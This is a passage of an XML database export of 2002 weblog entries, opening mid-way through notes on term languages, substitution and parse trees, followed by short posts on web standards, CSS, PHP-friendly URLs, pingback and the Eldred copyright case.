    { 0, 1  (constants)
&lt;/pre&gt;

&lt;p&gt;A grammar for this term language:&lt;/p&gt;

&lt;pre&gt;
&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt; ~&amp;gt; b(&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;, &lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;) | g(&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;, &lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;) | h(&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;) | 0 | 1 | variable
&lt;/pre&gt;

&lt;p&gt;A typical derivation:&lt;/p&gt;

&lt;pre&gt;
      &lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;
   b(&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;, &lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;)
 b(&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;, g(&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;, &lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;))
b(&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;, g(h(&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;), &lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;)) =&amp;gt;* b(X, g(h(Y), X))
&lt;/pre&gt;
     
&lt;h4&gt;Example 2&lt;/h4&gt;

&lt;pre&gt;
    { +, -, * (Arity 2)
σ = { 0, 1    (constants)

&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt; ~&amp;gt; (&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt; + &lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;) | (&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt; - &lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;) | (&lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt; * &lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt;) | 0 | 1 | variable
&lt;/pre&gt;

&lt;p&gt;Note that &lt;span style=&quot;text-decoration: underline;&quot;&gt;S&lt;/span&gt; is underlined to avoid confusion with the variable S. We do &lt;em&gt;not&lt;/em&gt; assume that +, -, *, 0 and 1 have their usual meanings. (0 + 0) is not the same as 0, and X is not the same as (X + 0).&lt;/p&gt;

&lt;h4&gt;Interpretation (Semantics) of a Term Language&lt;/h4&gt;

&lt;p&gt;Suppose T&lt;sub&gt;σ&lt;/sub&gt; is a term language with signature:&lt;/p&gt;

&lt;pre&gt;
    { ƒ&lt;sub&gt;1&lt;/sub&gt;...ƒ&lt;sub&gt;j&lt;/sub&gt; (with arities n&lt;sub&gt;1&lt;/sub&gt;...n&lt;sub&gt;j&lt;/sub&gt;)
σ = { c&lt;sub&gt;1&lt;/sub&gt; ... c&lt;sub&gt;k&lt;/sub&gt;
&lt;/pre&gt;

&lt;p&gt;An &lt;dfn&gt;interpretation&lt;/dfn&gt; of a term language gives a specific meaning in some function space to each function symbol in the signature. For T&lt;sub&gt;σ&lt;/sub&gt; the interpretation is a structure (D, ƒ&lt;sub&gt;1&lt;/sub&gt;...ƒ&lt;sub&gt;j&lt;/sub&gt;, c&lt;sub&gt;1&lt;/sub&gt;...c&lt;sub&gt;k&lt;/sub&gt;):&lt;/p&gt;

&lt;pre&gt;
     n&lt;sub&gt;i&lt;/sub&gt;
ƒ&lt;sub&gt;i&lt;/sub&gt; : D -&amp;gt; D   i = 1...j
c&lt;sub&gt;1&lt;/sub&gt; .... c&lt;sub&gt;k&lt;/sub&gt; are in set D
&lt;/pre&gt;

&lt;p&gt;An interpretation for example 2 could be defined:&lt;/p&gt;

&lt;p&gt;I&lt;sub&gt;1&lt;/sub&gt; = (Z, usual +, usual =, usual *, usual 0, usual 1)&lt;/p&gt;

&lt;p&gt;In which case ((X + Y) * Z) evaluated for X = 2, Y = 3, Z = 2 would equal (2 + 3) * 2) = 10. However, an alternative interpretation could use the following rules:&lt;/p&gt;

&lt;pre&gt;
I = ( {R, B} + defined as R + R = R
                          R + B = R
                          B + R = R
                          B + B = B
             - defined as R - R = R
                          R - B = R
                          B - R = R
                          B - B = R
             * defined as R * R = B
                          R * B = B
                          B * R = B
                          B * B = R
             0 is R (Red)
             1 is B (Blue)
)
&lt;/pre&gt;

&lt;p&gt;This interpretation is perfectly valid as the functions all have the required arity. The expression ((X + Y) * Z) evaluated with X = B, Y = R, Z = B is ((B + R) * B) = R * B = B so the answer would be Blue.&lt;/p&gt;

&lt;h3&gt;Parse Trees&lt;/h3&gt;

&lt;p&gt;We may display a term as a tree with function names on the interior nodes and constants and variables on the frontier.&lt;/p&gt;

&lt;pre&gt;
((X + Y) * Z) becomes   *
                       / \
                      +   Z
                     / \
                    X   Y
&lt;/pre&gt;

&lt;p&gt;Derivations may also be written as growing trees starting at the root:&lt;/p&gt;

&lt;pre&gt;
S =&amp;gt; *  =&amp;gt;   *
    / \     / \
   S   S   S   +
              / \
             S   S etc
&lt;/pre&gt;

&lt;p&gt;We have been talking about grammars generating languages, so grammars can be thought of as growing parse trees from the root down. Evaluations on the other hand seem to go the other way, starting from the frontier and working up. The idea is that &lt;em&gt;all&lt;/em&gt; languages work like this - even spoken languages such as English.&lt;/p&gt;

&lt;h4&gt;Language Picture&lt;/h4&gt;

&lt;p&gt;Speaker - uses a grammar to grow a parsetree top down, then passes the resulting sentence to a listener.&lt;/p&gt;

&lt;p&gt;Listener - evaluates the sentence starting at the frontier and working back up the parse tree.&lt;/p&gt;

&lt;p&gt;This is how parsers and compilers in computer science work.&lt;/p&gt;

&lt;p&gt;The &lt;dfn&gt;outermost operator&lt;/dfn&gt; of a term is the function name that appears at the top of the tree. This is &lt;em&gt;first&lt;/em&gt; in derivation, &lt;em&gt;last&lt;/em&gt; in evaluation.&lt;/p&gt;

&lt;h3&gt;Substitution&lt;/h3&gt;

&lt;p&gt;Suppose N is a term in a term language, X&lt;sub&gt;1&lt;/sub&gt;...X&lt;sub&gt;n&lt;/sub&gt; are variables and M&lt;sub&gt;1&lt;/sub&gt;...M&lt;sub&gt;n&lt;/sub&gt; are terms. If we wish to simultaneously replace X&lt;sub&gt;1&lt;/sub&gt; with M&lt;sub&gt;1&lt;/sub&gt;...X&lt;sub&gt;n&lt;/sub&gt; with M&lt;sub&gt;n&lt;/sub&gt; in N we can use the following notation:&lt;/p&gt;

&lt;pre&gt;
N[X&lt;sub&gt;1&lt;/sub&gt; := M&lt;sub&gt;1&lt;/sub&gt;, X&lt;sub&gt;2&lt;/sub&gt; := M&lt;sub&gt;2&lt;/sub&gt;, ..., X&lt;sub&gt;n&lt;/sub&gt; := M&lt;sub&gt;n&lt;/sub&gt; ]
&lt;/pre&gt;

&lt;p&gt;The above operator (the bit in the square braces) is called &lt;dfn&gt;substitution&lt;/dfn&gt;.&lt;/p&gt;

&lt;h4&gt;Example&lt;/h4&gt;

&lt;pre&gt;
N = X + Y
σ&lt;sub&gt; &lt;/sub&gt; = [X := (X + Y), Y := (X + Z)]
N&lt;sub&gt;σ&lt;/sub&gt; = (X + Y)&lt;sub&gt;σ&lt;/sub&gt; = ((X + Y) + (X + Z))
&lt;/pre&gt;

&lt;p&gt;Note that if we apply the substitution sequentially rather than all at once we get this: ((X + (X + Z)) + (X + Z)) which is different from the above. In general, M[X&lt;sub&gt;1&lt;/sub&gt; := M&lt;sub&gt;1&lt;/sub&gt;, X&lt;sub&gt;n&lt;/sub&gt; := M&lt;sub&gt;n&lt;/sub&gt;] is &lt;em&gt;not&lt;/em&gt; the same as M[X&lt;sub&gt;1&lt;/sub&gt; := M&lt;sub&gt;1&lt;/sub&gt;][X&lt;sub&gt;2&lt;/sub&gt; := M&lt;sub&gt;2&lt;/sub&gt;]...[X&lt;sub&gt;n&lt;/sub&gt; := M&lt;sub&gt;n&lt;/sub&gt;].&lt;/p&gt;

&lt;p&gt;An example:&lt;/p&gt;

&lt;pre&gt;
[CATS := DOGS][DOGS := CATS]
DOGS[CATS := DOGS][DOGS := CATS] = CATS
CATS[CATS := DOGS][DOGS := CATS] = CATS
&lt;/pre&gt;

&lt;p&gt;The above example always ends in cats.&lt;/p&gt;

&lt;p&gt;Final note: Substitutions do not commute.&lt;/p&gt;</field>
		<field name="created">2002-10-03 15:20:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">476</field>
		<field name="title">Sidekick suck</field>
		<field name="slug">sidekickSucks</field>
		<field name="body">&lt;p&gt;Leonard Lin has a new &lt;a href=&quot;http://www.hiptop.com/&quot;&gt;HipTop&lt;/a&gt; - a hand-held wireless device for browsing the internet. His &lt;a href=&quot;http://randomfoo.net/?p=2002_09_29_archive.inc#85514485&quot; title=&quot;Checklist of how blogs look...&quot;&gt;description&lt;/a&gt; of how well different sites work in the device makes for depressing reading. Blogs constructed with CSS and web standards in mind frequently fair &lt;em&gt;worse&lt;/em&gt; than less well structured sites - it seems that rather than ignoring the CSS as it should do the device's browser attempts to render it and mangles sites in the process. Anil Dash has an excellent &lt;a href=&quot;http://www.dashes.com/anil/index.php?archives/003378.php&quot; title=&quot;Hiptop Hooray? Nay.&quot;&gt;summary&lt;/a&gt; of why this is a Bad Thing(TM) for all involved.&lt;/p&gt;</field>
		<field name="created">2002-10-03 15:31:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">477</field>
		<field name="title">Sam Ruby joins up</field>
		<field name="slug">samRubyJoinsUp</field>
		<field name="body">&lt;p&gt;Sam Ruby &lt;a href=&quot;http://www.intertwingly.net/blog/878.html&quot; title=&quot;No pingbacks yet&quot;&gt;has pingback&lt;/a&gt;. &lt;em&gt;Ping!&lt;/em&gt;&lt;/p&gt;</field>
		<field name="created">2002-10-03 20:16:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">478</field>
		<field name="title">.NET saves Boy!</field>
		<field name="slug">dotNetSavesBoy</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.webservile.com/stories/downwell.htm&quot;&gt;.NET Saves Boy Down Well&lt;/a&gt; (via &lt;a href=&quot;http://www.intertwingly.net/blog/882.html&quot; title=&quot;.NET Saves Boy Down Well&quot;&gt;Sam Ruby&lt;/a&gt;):&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.webservile.com/stories/downwell.htm&quot;&gt;&lt;p&gt;
&quot;Once the thing was installed, well, hell, it pretty-much ran itself. I guess that's why they call it 'no-touch' deployment. We just fired that baby up and wizz-bang-a-doodle, it had that boy out of the well in a matter of minutes. Plus, it balanced the department's books, got us some apple fritters and impregnated our receptionist, Mary-Lou. This .NET Framework the cat's meow. Course, we're still not exactly sure what it is. Nobody at Microsoft could tell us, either.&quot;
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-10-04 16:36:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">479</field>
		<field name="title">Sensible URLs with PHP</field>
		<field name="slug">cmsUrls</field>
		<field name="body">&lt;p&gt;Brent Simmon's &lt;a href=&quot;http://inessential.com/?comments=1&amp;amp;postid=2190&quot;&gt;Law of CMS URLs&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://inessential.com/?comments=1&amp;amp;postid=2190&quot;&gt;&lt;p&gt;
The more expensive the CMS, the crappier the URLs.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The article includes an interesting comments thread discussing human readable URLs and why so many high end content management systems just don't bother with them. There are a couple of interesting links as well: &lt;a href=&quot;http://www.adaptivepath.com/publications/essays/archives/000058.php&quot;&gt;User-Centered URL Design&lt;/a&gt; and a useful description of &lt;a href=&quot;http://216.239.53.100/search?q=cache:XXBsD-jXsDIC:cms.filsa.net/archives/cms-list/2000/0649.html+vignette+urls&quot;&gt;how Vignette StoryServer URLs are structured&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I am a big fan of logical URLs (as can be seen on this site) - the combination of PHP and Apache makes it easy to have all requests to a specific sub-directory of a site handled by a single script. Here's the &lt;code&gt;.htaccess&lt;/code&gt; file for the root directory of my blog:&lt;/p&gt;

&lt;pre&gt;
&amp;lt;Files archive&amp;gt;
  ForceType application/x-httpd-php 
&amp;lt;/Files&amp;gt;
&amp;lt;Files categories&amp;gt;
  ForceType application/x-httpd-php
&amp;lt;/Files&amp;gt;
&amp;lt;Files contact&amp;gt;
  ForceType application/x-httpd-php
&amp;lt;/Files&amp;gt;
&amp;lt;Files syndicate&amp;gt;
  ForceType application/x-httpd-php
&amp;lt;/Files&amp;gt;
&lt;/pre&gt;

&lt;p&gt;The following PHP code (or a variation of it) is then used to break the requested URL up in to an array which can then be processed to decide what content to serve the user:&lt;/p&gt;

&lt;pre&gt;
$path = $_SERVER['REQUEST_URI'];
$bits = explode('/', $path);
&lt;/pre&gt;</field>
		<field name="created">2002-10-04 17:04:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">480</field>
		<field name="title">Eric has permalinks</field>
		<field name="slug">ericHasPermalinks</field>
		<field name="body">&lt;p&gt;Eric Meyer now has &lt;a href=&quot;http://www.meyerweb.com/eric/thoughts/2002b.html#t20021004&quot; title=&quot;A Transformation In My Thinking&quot;&gt;permalinks&lt;/a&gt;! Now if he would only start &lt;a href=&quot;http://newhome.weblogs.com/pingSiteForm&quot; title=&quot;Ping-Site Form&quot;&gt;pinging&lt;/a&gt; weblogs.com when he updated I (and many others) could add him to their &lt;a href=&quot;http://blo.gs/&quot;&gt;blo.gs&lt;/a&gt;-powered blogroll.&lt;/p&gt;

&lt;p&gt;The other day I &lt;a href=&quot;http://simon.incutio.com/archive/2002/09/30/#utterMuppets&quot;&gt;complained&lt;/a&gt; about &lt;a href=&quot;http://www.kpmg.com/&quot;&gt;KPMG.com&lt;/a&gt; falling apart in Mozilla. KPMG's web team could do well by listening to Eric, who took two and a half hours to hack together a &lt;a href=&quot;http://www.meyerweb.com/eric/fixed/kpmg/&quot;&gt;fixed version&lt;/a&gt; of their site. While it doesn't completely adhere to standards it &lt;em&gt;does&lt;/em&gt; work cross browser (and the DHTML even works in Opera!). Bare in mind Eric's &lt;a href=&quot;http://www.meyerweb.com/eric/thoughts/2002b.html#t20020923&quot; title=&quot;KPMG Revisited&quot;&gt;disclaimer&lt;/a&gt; when looking at the code:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.meyerweb.com/eric/thoughts/2002b.html#t20020923&quot;&gt;&lt;p&gt;I'd also like to reiterate for those of you planning to dig into the source of the fix that it's not an example of completely standards compliant design. It's merely an example of how one person, with a modicum of effort, was able to take an outdated design method and hack in some semblance of standards support in order to take a broken site and make it work in multiple browsers. It isn't perfect, but maybe it's a start.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-10-07 13:45:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">481</field>
		<field name="title">Free the mouse</field>
		<field name="slug">freeTheMouse</field>
		<field name="body">&lt;p&gt;On Wednesday, Laurence Lessig will take on the Supreme Court in &lt;a href=&quot;http://eldred.cc/&quot;&gt;Eldred v. Ashcroft&lt;/a&gt;. He will probably lose, but I sure hope he doesn't. Last night I watched Lessig's &lt;a href=&quot;http://randomfoo.net/oscon/2002/lessig/&quot;&gt;&amp;lt;free culture&amp;gt;&lt;/a&gt; keynote presentation from OSCon (made available in Flash format by Leonard Lin) with my girlfriend, and I've been catching up on the case with this &lt;a href=&quot;http://www.wired.com/wired/archive/10.10/lessig.html&quot; title=&quot;Lawrence Lessig&amp;apos;s Supreme Showdown&quot;&gt;Wired article&lt;/a&gt; and MSNBC's &lt;a href=&quot;http://www.msnbc.com/news/817175.asp?cp1=1&quot;&gt;Glitterati vs Geeks&lt;/a&gt;. &lt;a href=&quot;http://lessig.org/&quot;&gt;Lessig's blog&lt;/a&gt; has some interesting links as well.&lt;/p&gt;</field>
		<field name="created">2002-10-07 13:48:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">482</field>
		<field name="title">Taking a leaf from Pingback's book</field>
		<field name="slug">takingALeafFromPingbacksBook</field>
		<field name="body">&lt;p&gt;Moveable Type 2.5 is &lt;a href=&quot;http://www.movabletype.org/25/&quot; title=&quot;Download Version 2.5&quot;&gt;out&lt;/a&gt;. From the &lt;a href=&quot;http://www.movabletype.org/docs/mtchanges.html#2.5%20(2002.10.08)&quot;&gt;changelog&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.movabletype.org/docs/mtchanges.html#2.5%20(2002.10.08)&quot;&gt;
&lt;p&gt;
Added TrackBack auto-discovery, which can automatically find TrackBack ping URLs based on permalinks in entry bodies. These entries can then be pinged without any extra effort. Inspired in part by the pingback specification.
&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2002-10-10 13:01:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">483</field>
		<field name="title">Google News to RSS</field>
		<field name="slug">googleNewsToRSS</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.voidstar.com/gnews2rss.php&quot;&gt;Google News to RSS&lt;/a&gt; is brilliant. Simply type in some search terms (or append them to a query string) and the script queries Google News and returns the results formatted as RSS, allowing you to add a customised feed to your aggregator to follow interesting news stories.&lt;/p&gt;</field>
		<field name="created">2002-10-10 13:02:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">484</field>
		<field name="title">Eldred oral arguments</field>
		<field name="slug">eldredOralArguments</field>
		<field name="body">&lt;p&gt;Lots of news on &lt;a href=&quot;http://eldred.cc/&quot;&gt;Eldred vs Ashcroft&lt;/a&gt; today. The best account I've seen so far of proceedings in the courtroom is &lt;a href=&quot;http://allafrica.com/staff/kwindla/eldred.txt&quot; title=&quot;Eldred vs Ashcroft, October 9 2002&quot;&gt;this one&lt;/a&gt; by Kwindla Hultman Kramer, who has a press pass and was thus allowed to take notes in the court room. I tried to explain to a house mater yesterday why extending the copyright term is bad for creativity, but today I found &lt;a href=&quot;http://a.wholelottanothing.org/more.blah/moreID/16&quot; title=&quot;Copyright and the Commons&quot;&gt;this article&lt;/a&gt; which does a much better job than I did. Slashdot has &lt;a href=&quot;http://yro.slashdot.org/yro/02/10/09/1640249.shtml&quot; title=&quot;Eldred v. Ashcroft Oral Arguments&quot;&gt;some excellent links&lt;/a&gt; and a lengthy discussion as well.&lt;/p&gt;</field>
		<field name="created">2002-10-10 13:08:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">485</field>
		<field name="title">Voostind interview</field>
		<field name="slug">voostindInterviewed</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.devarticles.com/content.php?articleId=218&amp;amp;page=1&quot;&gt;Virtual Interview: Vince Oostindie&lt;/a&gt; (via &lt;a href=&quot;http://techno-weenie.com/2002/10/08.php&quot;&gt;techno weenie&lt;/a&gt;). Vincent is the author of the excellent &lt;a href=&quot;http://www.students.cs.uu.nl/people/voostind/eclipse/&quot;&gt;Eclipse Library&lt;/a&gt; for PHP and a regular on the &lt;a href=&quot;http://www.sitepointforums.com/&quot;&gt;SitePoint forums&lt;/a&gt;, where he frequently educates people in programming PHP using &lt;acronym title=&quot;Object-Oriented Programming&quot;&gt;OOP&lt;/acronym&gt; methods. The interview is well worth a read if you are interested in either of these topics.&lt;/p&gt;</field>
		<field name="created">2002-10-10 14:20:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">486</field>
		<field name="title">The css-discuss Wiki is now live</field>
		<field name="slug">cssWikiLive</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://css-discuss.incutio.com/&quot;&gt;css-discuss wiki&lt;/a&gt; has finally gone live to the public. Here's &lt;a href=&quot;http://archivist.incutio.com/css-discuss/?id=14105&quot; title=&quot;[css-d] css-discuss Wiki launched (no longer password protected)&quot;&gt;my message&lt;/a&gt; to the mailing list announcing the launch.&lt;/p&gt;</field>
		<field name="created">2002-10-11 20:39:26</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">487</field>
		<field name="title">Wired Redesigns</field>
		<field name="slug">wiredRedesigns</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.wired.com/&quot;&gt;Wired&lt;/a&gt; have redesigned, and now boast one of the snazziest CSS layouts on the web. The redesign is explained in &lt;a href=&quot;http://www.wired.com/news/culture/0,1284,55675-2,00.html&quot;&gt;A Site for Your Eyes&lt;/a&gt;, and has already drawn commentary from &lt;a href=&quot;http://www.zeldman.com/daily/1002a.html#wired&quot;&gt;Jeffrey Zeldman&lt;/a&gt; and &lt;a href=&quot;http://diveintomark.org/archives/2002/10/11.html#domino&quot; title=&quot;Domino&quot;&gt;Mark Pilgrim&lt;/a&gt; (with plenty more certain to come). I think the title of Mark's entry pretty much sums it up - this could well be the high profile redesign the web standards movement has been waiting for.&lt;/p&gt;</field>
		<field name="created">2002-10-11 20:52:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">488</field>
		<field name="title">Google Answers uncovered</field>
		<field name="slug">googleAnswersUncovered</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.infotoday.com/searcher/oct02/west.htm&quot;&gt;Information for Sale: My Experience With Google Answers&lt;/a&gt; is a fascinating insight in to the world of &lt;a href=&quot;http://answers.google.com/&quot;&gt;Google Answers&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.infotoday.com/searcher/oct02/west.htm&quot;&gt;
&lt;p&gt;
The most money still goes to the researcher who answers the most high-paying questions, and this often breaks down into the researcher who is either quickest on the mouse or less principled about the weak points in the site mechanics.
&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The author has now &lt;a href=&quot;http://www.librarian.net/surreal.shtml&quot; title=&quot;How I Tried to Resign from Google Answers but Found I Was Already Fired&quot;&gt;resigned / been fired&lt;/a&gt; from from the pool of Google Answers researchers (&lt;a href=&quot;http://www.camworld.com/journal/2002/10/#11&quot;&gt;via CamWorld&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-10-12 13:25:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">489</field>
		<field name="title">Dave on tag soup</field>
		<field name="slug">daveOnTagSoup</field>
		<field name="body">&lt;p&gt;Dave Winer: &lt;a href=&quot;http://scriptingnews.userland.com/whatIsTagSoup&quot;&gt;What is Tag Soup?&lt;/a&gt;&lt;/p&gt;

&lt;blockquote cite=&quot;http://scriptingnews.userland.com/whatIsTagSoup&quot;&gt;
&lt;p&gt;They've already lost the argument. The Web is tag soup. People use blockquotes to indent. Even though the REST folk argue that it's anti-Web to do RPC, people do RPC anyway. There's a never-ending list of complaints, but they can be resolved. That's why I'm writing this little essaylet.&lt;/p&gt;

&lt;p&gt;Sometimes you invent something thinking you know how it's going to be used, and the world surprises you and uses it for something else. It's happened to me. I designed my first outliners to be &quot;idea processors.&quot; To make a long story short, more people used outliners to create presentations. Eventually I tired of being right and wanted to make money, so we developed the idea, people loved it and we made our shareholders rich, and everyone lived happily ever after.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I think Dave's missed some important details on this one. Firstly, just because something can be used for a particular purpose does not make it the right tool for the job - in the case of HTML blockquotes CSS provides a far superior method of achieving indentation without having to add meaningless code to the site's markup. Dave is right in saying things often end up serving a different purpose to that for which they were intended but that doesn't necessarily make it a good idea. It sounds like Dave's outliners were a great tool for presentations without meaning to be - blockquote is &lt;em&gt;not&lt;/em&gt; a great tool for indenting; it gives you no control over how large the indent will be and doesn't even guarantee an indent in non-mainstream browsers.&lt;/p&gt;</field>
		<field name="created">2002-10-12 22:14:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">490</field>
		<field name="title">List o' Links</field>
		<field name="slug">listOLinks</field>
		<field name="body">&lt;p&gt;Paul Freeman has a clever new feature on his blog: &lt;a href=&quot;http://www.dellah.com/orient/2002/10/13/list_o_links.shtml&quot;&gt;List o Links&lt;/a&gt;, a list of links that he wants to record without writing up a full blog entry. I'm tempted to borrow the idea (which originated with &lt;a href=&quot;http://www.dashes.com/anil/&quot;&gt;Anil Dash&lt;/a&gt;) but I'm slightly put off by the problem of integrating it with my existing blog archives. For the moment I think I'll borrow Mark Pilgrim's &lt;a href=&quot;http://diveintomark.org/archives/2002/10/03.html#catching_up&quot; title=&quot;Catching Up&quot;&gt;technique&lt;/a&gt; of occasionally posting &quot;catch up&quot; entries with a bunch of blog-worthy links.&lt;/p&gt;</field>
		<field name="created">2002-10-13 23:44:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">491</field>
		<field name="title">Catch-up time</field>
		<field name="slug">catachUpTime</field>
		<field name="body">&lt;p&gt;Catch up time...&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://devedge.netscape.com/viewsource/2002/wired-interview/&quot;&gt;An Interview With Douglas Bowman of Wired News&lt;/a&gt; - Eric Meyer interviews the man who headed up the team responsible for the fantastic new CSS Wired design. A great article both for technical information and CSS advocacy.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://archivist.incutio.com/css-discuss/?id=14075&quot;&gt;[css-d] Wired News: Look, Ma, No Tables!&lt;/a&gt; - An extensive thread on CSS-Discuss discussing the Wired redesign.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.dashes.com/anil/index.php?archives/003475.php&quot;&gt;Danger Revisited&lt;/a&gt; - Anil Dash recieves a response to his &lt;a href=&quot;http://www.dashes.com/anil/index.php?archives/003378.php&quot; title=&quot;Hiptop Hooray? Nay&quot;&gt;HopTop rants&lt;/a&gt; from Danger, the company behind the device.&lt;/li&gt;
&lt;li&gt;ALA: &lt;a href=&quot;http://www.alistapart.com/stories/phpswitch/&quot;&gt;Build a PHP Switcher&lt;/a&gt; - How to build a stylesheet switcher in PHP. ALA is excellent for client side articles but unfortunately much of their server side content leaves a lot to be desired. The suggested script fails to use PHP's superglobals and it looks like it could introduce a security flaw in the form of an HTML injection attack. More on this later.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://news.com.com/2100-1017-961803.html?tag=fd_top_6&quot;&gt;IBM flushes restroom patent&lt;/a&gt; - the US patent system is &lt;em&gt;still&lt;/em&gt; a complete joke.&lt;/li&gt;
&lt;li&gt;Larry Lessig: &lt;a href=&quot;http://cyberlaw.stanford.edu/lessig/blog/archives/2002_10.shtml#000531&quot;&gt;From the front line&lt;/a&gt; - Larry's write up of the Eldred oral hearing.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2002-10-13 23:58:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">492</field>
		<field name="title">Scam the spammers</field>
		<field name="slug">scamTheSpammers</field>
		<field name="body">&lt;p&gt;Here's a fun new way to waste time on the internet: &lt;a href=&quot;http://www.geocities.com/steerp1ke/&quot;&gt;Scamming Nigerian spammers&lt;/a&gt;. This guy has a whole bunch of entertaining email exchanges with Nigerian scam artists, but the best has to be the &lt;a href=&quot;http://www.geocities.com/steerp1ke/David_Ehi.html&quot;&gt;Cthulu themed scam&lt;/a&gt;. Watch the Nigerian scam artists get slowly sucked in to a world of cults, demons and unspeakable horror.&lt;/p&gt;</field>
		<field name="created">2002-10-15 11:20:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">493</field>
		<field name="title">Python e-mail features</field>
		<field name="slug">pythonEmail</field>
		<field name="body">&lt;p&gt;Python 2.2.2 is &lt;a href=&quot;http://www.python.org/2.2.2/&quot; title=&quot;Python 2.2.2&quot;&gt;out&lt;/a&gt;. It's mostly bug fixes, but they have also included the latest version of the &lt;a href=&quot;http://mimelib.sourceforge.net/&quot;&gt;Python email package&lt;/a&gt;. I've been playing with Python's email features recently as part of an experimental idea to import all of my mail (from various accounts) in to a mySQL database and build my own web mail / mail application program. Working with email in Python is beautfully simple, thanks to the aforementioned email package and the powerful pop3 and IMAP classes in the standard library.&lt;/p&gt;</field>
		<field name="created">2002-10-15 11:47:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">494</field>
		<field name="title">Mozilla prefetching</field>
		<field name="slug">mozillaPrefetching</field>
		<field name="body">&lt;p&gt;The Mozilla &lt;a href=&quot;http://www.mozilla.org/projects/netlib/Link_Prefetching_FAQ.html&quot;&gt;Link Prefetching FAQ&lt;/a&gt; (via &lt;a href=&quot;http://www.deftone.com/blogzilla/archives/mozilla_getting_faster.html&quot; title=&quot;Mozilla, getting faster? &quot;&gt;Blogzilla&lt;/a&gt;). Prefetching is &lt;q cite=&quot;http://www.mozilla.org/projects/netlib/Link_Prefetching_FAQ.html&quot;&gt;a browser mechanism, which utilizes browser idle time to download or prefetch documents that the user might visit in the near future&lt;/q&gt;. Web page authors can turn on prefetching for their pages using a &amp;lt;link rel=&quot;prefetch&quot;&amp;gt; or &amp;lt;link rel=&quot;next&quot;&amp;gt; element (or the corresponding Link: headers). &lt;/p&gt;

&lt;p&gt;While this looks like being an excellent feature, I'm slightly concerned by a couple of aspects of the implementation. Firstly, I don't understand the necessity for following rel=&quot;next&quot; links as well as rel=&quot;prefetch&quot; ones. A &quot;next&quot; page does not necessarily mean the user will go there - in fact, thanks to the big accessibility drive at the moment many sites are adding rel=&quot;next&quot; elements that follow the logical order of the site without making it any more likely that a user will follow them. A key example of this is weblog archives - many blogs have next/prev link elements to indicate the next and previous archive pages. Few readers will ever folow them but they are there because they reflect the logical structure of the site.&lt;/p&gt;

